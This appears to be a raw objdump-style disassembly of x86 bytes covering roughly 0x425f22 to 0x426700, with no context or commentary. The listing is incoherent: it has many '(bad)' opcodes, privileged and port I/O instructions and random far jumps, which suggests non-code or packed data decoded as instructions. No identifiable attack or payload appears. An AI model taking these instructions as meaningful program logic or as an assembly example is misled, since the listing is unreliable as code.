  425f22:	xor    bl,BYTE PTR [ebp+edi*2+0x6f2b494c]
  425f29:	pusha  
  425f2a:	adc    al,0x6f
  425f2c:	pop    esp
  425f2d:	jl     0x425f6c
  425f2f:	inc    ecx
  425f30:	add    edx,edx
  425f32:	and    DWORD PTR [ecx],edi
  425f34:	(bad)  
  425f35:	pusha  
  425f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f37:	stos   DWORD PTR es:[edi],eax
  425f38:	fsubr  QWORD PTR [eax]
  425f3a:	les    ecx,FWORD PTR [ebx+0xb]
  425f3d:	popa   
  425f3e:	inc    esp
  425f3f:	retf   0xfcbc
  425f42:	sub    BYTE PTR [edi],ch
  425f44:	fs (bad) 
  425f46:	out    dx,al
  425f47:	add    bh,BYTE PTR [esi-0x57]
  425f4a:	push   ebp
  425f4b:	je     0x425f96
  425f4d:	cwde   
  425f4e:	mov    bl,0xa1
  425f50:	stos   DWORD PTR es:[edi],eax
  425f51:	mov    ds:0x1fecd82f,al
  425f56:	xchg   DWORD PTR [ecx-0x2211c4c4],eax
  425f5c:	loop   0x425efa
  425f5e:	pop    esp
  425f5f:	mov    WORD PTR [ecx+0x58],gs
  425f62:	retf   
  425f63:	mov    al,ds:0x7f5bb6dc
  425f68:	inc    ebp
  425f69:	repz fmul QWORD PTR [edx]
  425f6c:	pop    esi
  425f6d:	mov    al,ds:0x3b730010
  425f72:	std    
  425f73:	(bad)  [edi-0x241a46a1]
  425f79:	push   ebp
  425f7a:	mov    ds:0x13ace459,eax
  425f7f:	lds    ebx,FWORD PTR [esi-0x31]
  425f82:	push   ds
  425f83:	shr    eax,1
  425f85:	rcl    al,1
  425f87:	pusha  
  425f88:	mov    al,0x60
  425f8a:	out    dx,eax
  425f8b:	ss inc ebx
  425f8d:	stos   BYTE PTR es:[edi],al
  425f8e:	or     esp,DWORD PTR [esi-0x71]
  425f91:	add    ch,dh
  425f93:	and    eax,0xe33b0111
  425f98:	xor    BYTE PTR [ebx],0x54
  425f9b:	mov    ds:0x4c66be3b,eax
  425fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fa1:	imul   ecx,esi,0xedf362b2
  425fa7:	xchg   ebp,eax
  425fa8:	loope  0x425f86
  425faa:	mov    ebx,0x42681d64
  425faf:	sub    DWORD PTR [eax-0x43],ebp
  425fb2:	popf   
  425fb3:	or     DWORD PTR [edx-0x165e2298],edx
  425fb9:	pusha  
  425fba:	in     eax,0x0
  425fbc:	inc    esp
  425fbd:	fstp   QWORD PTR [ecx+0x1b]
  425fc0:	inc    eax
  425fc1:	adc    eax,0xa2bc0aee
  425fc6:	sti    
  425fc7:	dec    ebx
  425fc8:	adc    edx,DWORD PTR [edi]
  425fca:	mov    edx,0x165e63a0
  425fcf:	imul   BYTE PTR [edi+esi*1+0x49]
  425fd3:	pop    esp
  425fd4:	pop    esi
  425fd5:	outs   dx,DWORD PTR ds:[esi]
  425fd6:	into   
  425fd7:	and    edi,ebp
  425fd9:	in     eax,0x38
  425fdb:	sahf   
  425fdc:	mov    dl,0x60
  425fde:	inc    esi
  425fdf:	dec    eax
  425fe0:	push   eax
  425fe1:	lock cdq 
  425fe3:	mov    ebp,0xacef00f4
  425fe8:	inc    eax
  425fe9:	fwait
  425fea:	dec    ebx
  425feb:	mov    edx,0x71086bff
  425ff0:	(bad)  
  425ff1:	push   ecx
  425ff2:	sbb    edi,DWORD PTR [ebx]
  425ff4:	cmp    eax,0x9188b8b2
  425ff9:	inc    edx
  425ffa:	pusha  
  425ffb:	cdq    
  425ffc:	pop    esi
  425ffd:	push   esp
  425ffe:	inc    eax
  425fff:	pop    ss
  426000:	aad    0x73
  426002:	fwait
  426003:	xor    dh,BYTE PTR [eax+0x5c]
  426006:	jnp    0x425fa8
  426008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426009:	addr16 cmp eax,0xbef45921
  42600f:	dec    edi
  426010:	pop    ebp
  426011:	aad    0x27
  426013:	inc    eax
  426014:	(bad)  
  426015:	sub    DWORD PTR [edi],ecx
  426017:	fisub  WORD PTR [esi-0x7a5ece7e]
  42601d:	fmul   QWORD PTR [esi-0x1a]
  426020:	lds    edi,FWORD PTR [eax+ebx*4-0x4698a14d]
  426027:	jbe    0x425fb1
  426029:	popf   
  42602a:	and    DWORD PTR [eax+0x6d],0xcbc53360
  426031:	(bad)  
  426032:	or     BYTE PTR [edi-0x11a03c],ch
  426038:	and    cl,BYTE PTR [esi+0x7]
  42603b:	adc    cl,BYTE PTR [ebp+0x2d10fc0d]
  426041:	popa   
  426042:	sbb    ecx,ebp
  426044:	sub    cl,dl
  426046:	shl    DWORD PTR [edi],cl
  426048:	stc    
  426049:	shl    ch,cl
  42604b:	cmc    
  42604c:	pop    esi
  42604d:	test   DWORD PTR [ecx],ecx
  42604f:	cli    
  426050:	push   esp
  426051:	xchg   esp,eax
  426052:	and    al,0x49
  426054:	dec    esi
  426055:	push   edx
  426056:	mov    esi,0x6b258ca8
  42605b:	and    BYTE PTR [ebx+0x50],ah
  42605e:	cs adc al,0xfd
  426061:	out    dx,al
  426062:	out    dx,al
  426063:	add    eax,0x95b0e226
  426068:	aad    0xc4
  42606a:	jmp    DWORD PTR [eax-0x1cbcd872]
  426070:	fcomp  st(3)
  426072:	aam    0xc8
  426074:	clc    
  426075:	lgdtd  [edx-0x5c]
  426079:	shr    DWORD PTR [esi-0x344534a5],1
  42607f:	fldenv [edi]
  426081:	jb     0x426062
  426083:	imul   cl
  426085:	loopne 0x426042
  426087:	dec    ebp
  426088:	add    eax,0xe7a1571f
  42608d:	add    BYTE PTR [edi],dl
  42608f:	jbe    0x42610c
  426091:	xchg   ebp,eax
  426092:	(bad)  
  426093:	aaa    
  426094:	mov    dh,0x74
  426096:	and    DWORD PTR [ebx-0x159f1ec4],edx
  42609c:	in     eax,dx
  42609d:	mov    ecx,DWORD PTR [esp+esi*2-0x6]
  4260a1:	jp     0x426069
  4260a3:	dec    esp
  4260a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260a5:	pusha  
  4260a6:	push   eax
  4260a7:	pop    edx
  4260a8:	aas    
  4260a9:	loope  0x4260f0
  4260ab:	cmp    al,0x5e
  4260ad:	imul   ecx,DWORD PTR [eax+0x7d],0xffffffe3
  4260b1:	ds mov esp,0xbf7277a9
  4260b7:	mov    ch,0xb3
  4260b9:	inc    edx
  4260ba:	push   edi
  4260bb:	dec    edi
  4260bd:	pusha  
  4260be:	cwde   
  4260bf:	aas    
  4260c0:	into   
  4260c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260c2:	dec    esi
  4260c3:	jmp    0xebe2:0x637d6d5e
  4260ca:	xchg   edi,eax
  4260cb:	shr    BYTE PTR [edx-0x7f0228a0],0xb
  4260d2:	mov    BYTE PTR [eax+eax*8+0x5bd7dc0d],ah
  4260d9:	xchg   ebp,eax
  4260da:	fstp   DWORD PTR [esi-0x67]
  4260dd:	pop    ds
  4260de:	inc    DWORD PTR [eax]
  4260e0:	mov    ah,0xf3
  4260e2:	jae    0x426071
  4260e4:	xor    BYTE PTR [eax-0x3b6d5f51],0xcb
  4260eb:	dec    ebx
  4260ec:	mov    edx,0x5eb26583
  4260f1:	retf   0x36a2
  4260f4:	mov    esp,0x5a4ee5b0
  4260f9:	mov    ch,0x24
  4260fb:	mov    eax,ds:0xabf57e32
  426100:	in     al,0x2f
  426102:	add    edi,ecx
  426104:	repz sub ch,dh
  426107:	mov    edx,0x2fc3ad3e
  42610c:	imul   eax,DWORD PTR [edx+esi*2-0x5f],0xfffffff8
  426111:	test   al,0xfd
  426113:	iret   
  426114:	out    dx,al
  426115:	adc    dl,dh
  426117:	inc    esp
  426118:	pop    ebp
  426119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42611a:	or     BYTE PTR [eax-0x3486a360],al
  426120:	push   0xe
  426122:	mov    bl,0xf2
  426124:	add    ah,BYTE PTR [ecx-0x3d]
  426127:	and    eax,0xf612e48b
  42612c:	clc    
  42612d:	mov    ds:0x988d13ff,al
  426132:	cs scas al,BYTE PTR es:[edi]
  426134:	push   eax
  426135:	or     esi,esi
  426137:	shl    dh,0x60
  42613a:	push   ebp
  42613b:	jbe    0x426104
  42613d:	cmp    al,0x16
  42613f:	adc    al,BYTE PTR [ebx]
  426141:	xchg   edi,eax
  426142:	out    dx,eax
  426143:	add    dh,cl
  426145:	in     eax,dx
  426146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426148:	popa   
  426149:	clc    
  42614a:	sbb    DWORD PTR [ecx],0x43
  42614d:	adc    edx,ecx
  42614f:	mov    al,ds:0xbee79306
  426154:	sub    al,0x5b
  426156:	aam    0xcb
  426158:	pop    esi
  426159:	sbb    esi,ebp
  42615b:	pushf  
  42615c:	cmp    dl,bh
  42615e:	mov    ebp,0x32e4536
  426163:	test   al,0x26
  426165:	and    ecx,DWORD PTR [esi+ecx*4-0x73]
  426169:	shr    BYTE PTR [edi+0x8431458],1
  42616f:	sub    dl,BYTE PTR [ecx-0x4529185e]
  426175:	clc    
  426176:	pop    esi
  426177:	fs enter 0x92a5,0xa1
  42617c:	pop    ebp
  42617d:	push   es
  42617e:	mov    ebx,0x5327ac49
  426183:	jge    0x4261e4
  426185:	(bad)  
  426186:	fld    DWORD PTR [ebx+0x594aa099]
  42618c:	stos   BYTE PTR es:[edi],al
  42618d:	mov    ds:0x21a1a482,al
  426192:	fisubr DWORD PTR [edx+0x2b]
  426195:	sbb    eax,0xf4391886
  42619a:	out    dx,eax
  42619b:	jg     0x42615c
  42619d:	mov    BYTE PTR [ecx+0x1aa63a61],al
  4261a3:	out    dx,eax
  4261a4:	popf   
  4261a5:	push   edx
  4261a6:	std    
  4261a7:	mov    ds:0x70ae820a,eax
  4261ac:	inc    esi
  4261ad:	icebp  
  4261ae:	inc    edi
  4261af:	(bad)  
  4261b0:	xor    DWORD PTR [eax-0x35],ecx
  4261b3:	mov    al,ds:0x8ece5f32
  4261b8:	int3   
  4261b9:	and    ecx,DWORD PTR [ecx-0x5f]
  4261bc:	fwait
  4261bd:	sbb    al,0xf3
  4261bf:	mov    eax,0xb77fe9b3
  4261c4:	pop    edi
  4261c5:	out    dx,al
  4261c6:	je     0x426192
  4261c8:	sub    BYTE PTR [ecx],al
  4261ca:	dec    ecx
  4261cb:	mov    eax,ds:0xf5ea1468
  4261d0:	loopne 0x42624a
  4261d2:	test   eax,0x3a0a5bb5
  4261d7:	mov    edx,0xe92eb289
  4261dc:	push   ebp
  4261dd:	imul   esp,DWORD PTR [eax],0xffffff8d
  4261e0:	xor    ecx,ecx
  4261e2:	xor    ah,ah
  4261e4:	retf   0xff43
  4261e7:	sub    BYTE PTR [esi+0x4b],0x28
  4261eb:	repz pop esi
  4261ed:	dec    edx
  4261ee:	shr    BYTE PTR [eax+0x7e],0x95
  4261f2:	adc    dh,BYTE PTR [esp+edx*2+0x5d]
  4261f6:	ss ror DWORD PTR cs:[ecx],cl
  4261fa:	jnp    0x42625d
  4261fc:	jns    0x4261a8
  4261fe:	in     al,dx
  4261ff:	fcomp  DWORD PTR [esi+0x0]
  426202:	jnp    0x4261cd
  426204:	add    eax,0xa75635e
  426209:	icebp  
  42620a:	adc    ah,BYTE PTR [ecx+0xa827751]
  426210:	and    DWORD PTR [ecx+0x2f],edi
  426213:	pop    esi
  426214:	pop    esi
  426215:	call   0x6d46b558
  42621a:	sub    cl,BYTE PTR [ebp+0x30]
  42621d:	mov    ds:0x1d36a25f,eax
  426222:	xor    BYTE PTR [eax],ch
  426224:	jne    0x42620f
  426226:	cmc    
  426227:	lock out dx,al
  426229:	jmp    0x2487:0x43468966
  426230:	pop    ebx
  426231:	or     DWORD PTR [esi],esi
  426233:	and    BYTE PTR fs:[esi+ecx*2-0x2d],al
  426238:	xchg   edx,eax
  426239:	push   esp
  42623a:	retf   
  42623b:	lahf   
  42623c:	dec    esi
  42623d:	or     esi,DWORD PTR [ebx+0x9ffbe9a]
  426243:	imul   ebx,ecx,0x5e7a6655
  426249:	sbb    ecx,DWORD PTR [esi+0x22817471]
  42624f:	div    DWORD PTR [eax-0x480fc8af]
  426255:	push   ebx
  426256:	mov    gs,WORD PTR [edx+0x77ec17df]
  42625c:	pop    esi
  42625d:	sti    
  42625e:	xlat   BYTE PTR ds:[ebx]
  42625f:	lds    ebp,FWORD PTR [ecx+0x42]
  426262:	mov    WORD PTR [ebx],cs
  426264:	int3   
  426265:	pusha  
  426266:	mov    ah,0x84
  426268:	xor    DWORD PTR [ebp+0x56],esp
  42626b:	mov    ah,0x36
  42626d:	jbe    0x42625d
  42626f:	fcom   DWORD PTR [ecx]
  426271:	jb     0x426230
  426273:	adc    eax,DWORD PTR [eax+0x20]
  426276:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  426278:	dec    ebx
  426279:	in     al,0xed
  42627b:	adc    BYTE PTR [ebp-0x5817e620],0xb8
  426282:	out    dx,al
  426283:	push   0x61e52d4
  426288:	retf   0x8e84
  42628b:	mov    eax,ds:0xa7d56be7
  426290:	(bad)  
  426291:	loopne 0x4262f0
  426293:	in     al,0x5e
  426295:	jg     0x4262a7
  426297:	push   ebp
  426298:	and    DWORD PTR [edi],esi
  42629a:	lods   eax,DWORD PTR ds:[esi]
  42629b:	jmp    0xd05e:0x161361c5
  4262a2:	pop    esi
  4262a3:	and    BYTE PTR [esi],ch
  4262a5:	ja     0x426232
  4262a7:	xor    al,0x5e
  4262a9:	xor    BYTE PTR [esi+0x10],ah
  4262ac:	packssdw mm2,QWORD PTR [edi-0x6b]
  4262b0:	cmp    BYTE PTR [ecx-0x3d],ah
  4262b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262b4:	fbstp  TBYTE PTR [edi+0x4e0c355e]
  4262ba:	out    dx,al
  4262bb:	or     DWORD PTR [edx+eiz*2+0x7a15474f],ecx
  4262c2:	pop    ecx
  4262c3:	outs   dx,DWORD PTR ds:[esi]
  4262c4:	xor    eax,0x9fbda161
  4262c9:	push   0xffffffba
  4262cb:	(bad)  
  4262cc:	pop    edx
  4262cd:	loope  0x4262cf
  4262cf:	xor    ecx,esi
  4262d1:	repz ret 0x5ecc
  4262d5:	mov    eax,0xa13f4369
  4262da:	push   0x8fbc5da1
  4262df:	ss (bad) 
  4262e1:	jle    0x42628d
  4262e3:	mov    BYTE PTR [esi-0x66],bl
  4262e6:	jns    0x4262ce
  4262e8:	into   
  4262e9:	in     eax,0xe3
  4262eb:	fadd   DWORD PTR [eax]
  4262ed:	popa   
  4262ee:	lea    edx,[edi]
  4262f0:	jae    0x4262fe
  4262f2:	inc    ebp
  4262f3:	mov    ch,BYTE PTR [edx-0x16f71594]
  4262f9:	sbb    dl,bl
  4262fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262fc:	fidivr WORD PTR [eax+0x61310285]
  426302:	and    ebx,DWORD PTR fs:[esi]
  426305:	test   BYTE PTR [ebx+ecx*4],dl
  426308:	mov    eax,ds:0xa86ceec4
  42630d:	adc    eax,0xdd3d9811
  426312:	loope  0x4262b4
  426314:	shr    DWORD PTR [eax-0x637fa072],cl
  42631a:	imul   edi,DWORD PTR [ebx+ebx*2+0x77f5fbd1],0xb2822d81
  426325:	jae    0x426372
  426327:	jns    0x42634a
  426329:	sub    ebp,DWORD PTR [edi-0x5f]
  42632c:	sub    al,0x9c
  42632e:	inc    esi
  42632f:	xor    eax,0x14b6c7e
  426334:	pop    esi
  426335:	push   edi
  426336:	sbb    esp,ebp
  426338:	aas    
  426339:	fisub  WORD PTR [eax+eiz*4]
  42633c:	or     DWORD PTR [ecx+0x56],esp
  42633f:	(bad)  
  426340:	adc    eax,0xf15ddd9
  426345:	push   ds
  426346:	add    DWORD PTR [ebx-0x579b726a],ecx
  42634c:	frndint 
  42634e:	paddusb mm1,mm6
  426351:	jne    0x426324
  426353:	pop    esi
  426354:	and    DWORD PTR [edi+0x60],ebx
  426357:	(bad)  
  426358:	xor    edi,esi
  42635a:	add    ebp,esp
  42635c:	or     DWORD PTR [ecx-0x3],esp
  42635f:	mov    WORD PTR [ebx-0x305f21e6],es
  426365:	add    dh,BYTE PTR [esi+0x6a]
  426368:	push   ebx
  426369:	mov    ds:0x9b4615b8,al
  42636e:	out    0x34,al
  426370:	repnz (bad) 
  426372:	out    0xe2,eax
  426374:	pop    ecx
  426375:	retf   0x9e9d
  426378:	push   cs
  426379:	in     al,0xd9
  42637b:	je     0x4263fc
  42637d:	pusha  
  42637e:	int    0x99
  426380:	jnp    0x42636b
  426382:	mov    DWORD PTR [eax+0x7eec2f0],ebx
  426388:	dec    esi
  426389:	stc    
  42638a:	or     ebx,0xa105df82
  426390:	mov    edx,fs
  426392:	sub    al,0xae
  426394:	das    
  426395:	pop    edi
  426396:	arpl   bp,bp
  426398:	and    bh,BYTE PTR [edx+ebp*8]
  42639b:	mov    al,ds:0xbbbd4e53
  4263a0:	mov    ds:0x9ea10788,al
  4263a5:	sar    BYTE PTR [esi+0x3cf82fff],1
  4263ab:	dec    edi
  4263ac:	pop    esi
  4263ad:	jno    0x4263a8
  4263af:	push   0xffffffea
  4263b1:	sbb    eax,0x66a1398c
  4263b6:	mov    edx,0x708e5a31
  4263bb:	dec    ebx
  4263bc:	fs repnz out dx,al
  4263bf:	mov    eax,ds:0xa1420a4
  4263c4:	dec    ecx
  4263c5:	popa   
  4263c6:	mov    esi,0xec6385da
  4263cb:	aam    0x5f
  4263cd:	ret    0x3eee
  4263d0:	add    al,0x8b
  4263d2:	call   0x5e38902b
  4263d7:	mov    eax,ds:0x744fe2f2
  4263dc:	or     al,ch
  4263de:	mov    ah,0x69
  4263e0:	pop    esi
  4263e1:	call   0x8c26:0x223f26f5
  4263e8:	frstor [esi+0x0]
  4263eb:	fstp   st(3)
  4263ed:	inc    esi
  4263ee:	inc    esp
  4263ef:	push   cs
  4263f0:	sbb    ecx,DWORD PTR [edi+0x63]
  4263f3:	test   BYTE PTR [esi+0x29],bh
  4263f6:	inc    ebx
  4263f7:	inc    esi
  4263f8:	cmp    al,0x50
  4263fa:	clc    
  4263fb:	jle    0x42645b
  4263fd:	and    esi,DWORD PTR [edx+0x38]
  426400:	pop    edi
  426401:	mov    ecx,0x2a76a89d
  426406:	loope  0x426435
  426408:	out    0x30,al
  42640a:	inc    eax
  42640b:	mov    eax,0xf9e7b06a
  426410:	cli    
  426411:	cmp    BYTE PTR [bp+di-0x5962],0x27
  426417:	cmp    BYTE PTR [ecx],cl
  426419:	mov    bh,0x33
  42641b:	mov    eax,ds:0x19e2101c
  426420:	jo     0x426468
  426422:	inc    ebx
  426423:	je     0x426489
  426425:	inc    esi
  426426:	adc    edi,DWORD PTR [ebp-0x176dcd9f]
  42642c:	js     0x4263e4
  42642e:	dec    esi
  42642f:	or     ecx,DWORD PTR [edi+0x39a19b0f]
  426435:	and    al,0x26
  426437:	fsub   QWORD PTR [edx]
  426439:	inc    eax
  42643a:	push   edx
  42643b:	inc    esp
  42643c:	pop    esi
  42643d:	adc    al,0xa7
  42643f:	call   ebx
  426441:	pop    es
  426442:	add    dh,BYTE PTR [edi]
  426444:	ds inc ebx
  426446:	and    eax,0xc15ffbcc
  42644b:	add    cl,BYTE PTR [edx+0x6c]
  42644e:	pop    ecx
  42644f:	jge    0x426433
  426451:	inc    ebx
  426452:	out    dx,al
  426453:	stos   DWORD PTR es:[edi],eax
  426454:	loopne 0x4263e9
  426456:	repz push 0xffffff8b
  426459:	mov    dh,0x87
  42645b:	mov    ds:0x2bda1dca,eax
  426460:	pop    edx
  426461:	xor    BYTE PTR [esi+0xc],ch
  426464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426465:	sub    edi,edx
  426467:	and    bl,BYTE PTR [esi-0x59]
  42646a:	bound  eax,QWORD PTR [ebp-0x29]
  42646d:	pop    edi
  42646e:	retf   0xe731
  426471:	pusha  
  426472:	dec    edx
  426473:	repnz ss pop edi
  426476:	std    
  426477:	cmp    ch,dl
  426479:	sub    esi,0x2ff6cb37
  42647f:	ins    DWORD PTR es:[edi],dx
  426480:	or     esi,edi
  426482:	add    eax,0xc94215a1
  426487:	shr    al,cl
  426489:	test   BYTE PTR [esi-0xc],cl
  42648c:	imul   DWORD PTR [eax-0x14]
  42648f:	scas   eax,DWORD PTR es:[edi]
  426490:	sar    DWORD PTR [ecx+eiz*8-0x1b],1
  426494:	add    BYTE PTR [eax-0x59],0x33
  426498:	std    
  426499:	pusha  
  42649a:	sti    
  42649b:	xchg   edi,eax
  42649c:	(bad)  
  42649d:	push   ss
  42649e:	jae    0x4264b4
  4264a0:	pop    edx
  4264a1:	test   al,0xec
  4264a3:	jns    0x426433
  4264a5:	jg     0x426447
  4264a7:	ins    DWORD PTR es:[edi],dx
  4264a8:	mov    edi,0x6adcd7c0
  4264ad:	scas   al,BYTE PTR es:[edi]
  4264ae:	loop   0x426450
  4264b0:	test   dl,0x4d
  4264b3:	addr16 mov eax,fs
  4264b6:	test   eax,0xa46963ae
  4264bb:	jge    0x426530
  4264bd:	pop    edi
  4264be:	mov    cl,0x3b
  4264c0:	xchg   edx,eax
  4264c1:	stos   DWORD PTR es:[edi],eax
  4264c2:	pop    edx
  4264c3:	fld    QWORD PTR ds:0x312cc861
  4264c9:	push   0xc2c22a1b
  4264ce:	out    dx,al
  4264cf:	(bad)  
  4264d0:	fcmovb st,st(7)
  4264d2:	jmp    0x86a1:0xdd4a193
  4264d9:	scas   eax,DWORD PTR es:[edi]
  4264da:	rcr    DWORD PTR ds:0xab0c5147,1
  4264e0:	repz cs out dx,al
  4264e3:	mov    WORD PTR ds:0xd8bb6a52,?
  4264e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264ea:	push   0x2f9d16a2
  4264ef:	call   0x976e:0x61229e74
  4264f6:	add    BYTE PTR [ebx],ch
  4264f8:	shl    DWORD PTR [ecx+eax*4],1
  4264fb:	shl    eax,cl
  4264fd:	loop   0x4264a9
  4264ff:	push   ebx
  426500:	in     eax,0xbf
  426502:	mov    esp,0x8c398ecc
  426507:	mov    ds:0xa04d7f83,al
  42650c:	jg     0x4264d8
  42650e:	add    DWORD PTR cs:[esi+0x6c],0xd5bb74ee
  426516:	and    DWORD PTR [edi+0x2b],edi
  426519:	inc    edi
  42651a:	or     eax,0xe2484ac5
  42651f:	mov    al,ds:0x1698f4b4
  426524:	lds    ebp,FWORD PTR [eax-0x12]
  426527:	mov    eax,0xea4b02b7
  42652c:	aaa    
  42652d:	jo     0x4264c3
  42652f:	lods   al,BYTE PTR ds:[esi]
  426530:	mov    dh,0x26
  426532:	outs   dx,BYTE PTR ds:[esi]
  426533:	xchg   edi,eax
  426534:	ja     0x426562
  426536:	push   0xffffff8f
  426538:	inc    edx
  426539:	mov    edx,0x391e84ee
  42653e:	sti    
  42653f:	pop    ds
  426540:	push   0x6ca169e6
  426545:	nop
  426546:	push   es
  426547:	sbb    eax,0xc48ef618
  42654c:	pop    edi
  42654d:	mov    ebx,0xde268114
  426552:	push   eax
  426553:	cmp    eax,ecx
  426555:	xchg   ebx,eax
  426556:	xchg   esi,eax
  426557:	mov    eax,ds:0xf5700d9d
  42655c:	dec    ebx
  42655d:	(bad)  
  42655e:	jg     0x4265cc
  426560:	pop    esi
  426561:	push   edi
  426562:	and    eax,0xdf969a76
  426567:	dec    esi
  426568:	sbb    BYTE PTR [ecx+0xa],ah
  42656b:	add    BYTE PTR [esi+esi*8-0x54],dl
  42656f:	fisub  WORD PTR [ecx-0xe5b79f1]
  426575:	in     al,0x4e
  426577:	pushf  
  426578:	pop    esi
  426579:	sahf   
  42657a:	leave  
  42657b:	mov    ebp,0x5f5f3a97
  426580:	add    eax,0xff88360
  426585:	jmp    0x7b0a:0xa08e9881
  42658c:	pop    esi
  42658d:	lods   al,BYTE PTR ds:[esi]
  42658e:	in     eax,0x6a
  426590:	in     eax,dx
  426591:	shl    ch,1
  426593:	add    BYTE PTR [ebx],dh
  426595:	mov    bh,0x46
  426597:	mov    eax,ds:0x2ee072e8
  42659c:	idiv   BYTE PTR [esi-0x79a10981]
  4265a2:	imul   ebx,DWORD PTR [edi-0x35],0x4f
  4265a6:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4265a8:	ds popa 
  4265aa:	hlt    
  4265ab:	jne    0x426531
  4265ad:	pop    edi
  4265ae:	cld    
  4265af:	xor    bl,BYTE PTR [ecx-0x5562fd00]
  4265b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265b6:	in     eax,dx
  4265b7:	ja     0x426602
  4265b9:	lds    esp,FWORD PTR [edx+0x9126aef]
  4265bf:	test   al,0xe3
  4265c1:	ficom  DWORD PTR [esi-0x1d7f4e69]
  4265c7:	xchg   ebx,eax
  4265c8:	ret    0x1b9
  4265cb:	scas   eax,DWORD PTR es:[edi]
  4265cc:	mov    esi,0xfe86ad03
  4265d1:	frstor [esi-0x6b8a8957]
  4265d7:	xchg   ebp,eax
  4265d8:	repz xchg esi,eax
  4265da:	repnz dec edx
  4265dc:	pop    esi
  4265dd:	pusha  
  4265de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265df:	adc    ebx,DWORD PTR [edx-0xd2ef500]
  4265e5:	sub    esi,0x32
  4265e8:	in     al,dx
  4265e9:	adc    esi,DWORD PTR [edi]
  4265eb:	aaa    
  4265ec:	xor    esi,DWORD PTR [ebx+0x1a07a11a]
  4265f2:	xchg   BYTE PTR [ecx-0x546af7e7],al
  4265f8:	pop    esi
  4265f9:	and    DWORD PTR [ebx-0x1d],ebp
  4265fc:	push   0xef6434cd
  426601:	push   ecx
  426602:	push   ecx
  426603:	das    
  426604:	inc    eax
  426605:	in     eax,0x20
  426607:	mov    al,0x64
  426609:	mov    eax,0x2048e1d
  42660e:	loope  0x4265f1
  426610:	cmc    
  426611:	hlt    
  426612:	jmp    0x5bcd:0xf9ad048f
  426619:	lea    edx,[eax]
  42661b:	inc    ebp
  42661c:	ja     0x42665e
  42661e:	dec    esi
  42661f:	outs   dx,DWORD PTR ds:[esi]
  426620:	or     esi,DWORD PTR [ebx+0xfc2a106]
  426626:	ror    ebx,cl
  426628:	jnp    0x4265ed
  42662a:	daa    
  42662b:	loope  0x42668d
  42662d:	mov    ebx,0x136938f
  426632:	jl     0x426635
  426634:	pop    es
  426635:	pop    edi
  426636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426637:	mov    eax,ds:0x336aa1ca
  42663c:	push   edx
  42663d:	or     eax,0x2a520ac8
  426642:	std    
  426643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426644:	pop    esi
  426645:	xor    BYTE PTR [edx+0x3f],bl
  426648:	repz pop eax
  42664a:	sbb    al,0xa1
  42664c:	xchg   edi,eax
  42664d:	idiv   BYTE PTR [edx+0x67]
  426650:	inc    ebp
  426651:	xor    DWORD PTR [ecx+0x4b],0x5e
  426655:	in     al,0x6a
  426657:	aad    0x6
  426659:	push   edx
  42665a:	xor    ah,BYTE PTR [eax]
  42665c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42665d:	pusha  
  42665e:	sub    al,0x1d
  426660:	int    0x37
  426662:	loop   0x426682
  426664:	das    
  426665:	js     0x426654
  426667:	ins    BYTE PTR es:[edi],dx
  426668:	repz (bad) [ebp+0x3]
  42666c:	dec    esi
  42666d:	cmp    eax,0xad3230e4
  426672:	out    dx,al
  426673:	ins    DWORD PTR es:[edi],dx
  426674:	aad    0x23
  426676:	mov    esp,0x31854cb8
  42667b:	mov    eax,ds:0xeb703de7
  426680:	aaa    
  426681:	je     0x426610
  426683:	je     0x4266e9
  426685:	cmp    BYTE PTR [ebp+0xf81243f],bl
  42668b:	dec    eax
  42668c:	mov    dl,0xbc
  42668e:	push   edx
  42668f:	mov    eax,ds:0xe1bf4d2b
  426694:	hlt    
  426695:	(bad)  
  426698:	pop    esi
  426699:	or     al,0x61
  42669b:	sub    DWORD PTR [ecx+0x5f],esp
  42669e:	pop    ds
  42669f:	std    
  4266a0:	inc    edx
  4266a1:	and    al,0xba
  4266a3:	mov    eax,ds:0x2184e26e
  4266a8:	jo     0x4266e1
  4266aa:	push   eax
  4266ab:	popa   
  4266ac:	push   ebp
  4266ad:	jge    0x42669d
  4266af:	test   al,0x8c
  4266b1:	out    0x3d,al
  4266b3:	retf   0x1dbd
  4266b6:	jp     0x4266c1
  4266b8:	add    esp,DWORD PTR [ecx+0x7b]
  4266bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266bc:	out    dx,al
  4266bd:	outs   dx,BYTE PTR ds:[esi]
  4266be:	ins    BYTE PTR es:[edi],dx
  4266bf:	dec    ebx
  4266c0:	int3   
  4266c1:	ds and al,0x59
  4266c4:	shl    al,cl
  4266c6:	mov    edx,0x297531bd
  4266cb:	cmp    BYTE PTR [edi-0x445a98db],bh
  4266d1:	pop    ebp
  4266d2:	pop    esp
  4266d3:	repz dec eax
  4266d5:	mov    eax,ds:0x30d4f6b5
  4266da:	out    dx,al
  4266db:	mov    esi,0x15080e8b
  4266e0:	imul   eax,DWORD PTR [edx+0x610af12b],0x9961fb6b
  4266ea:	addr16 xchg edi,eax
  4266ec:	push   es
  4266ed:	and    edx,0x9d904b02
  4266f3:	jbe    0x426753
  4266f5:	ja     0x426719
  4266f7:	pop    eax
  4266f8:	mov    dl,0xdb
  4266fa:	pop    esp
  4266fb:	out    dx,al
  4266fc:	inc    esp
  4266fd:	popa   
  4266fe:	(bad)  
  4266ff:	in     al,dx
  426700:	sub    DWORD PTR [esi],eax
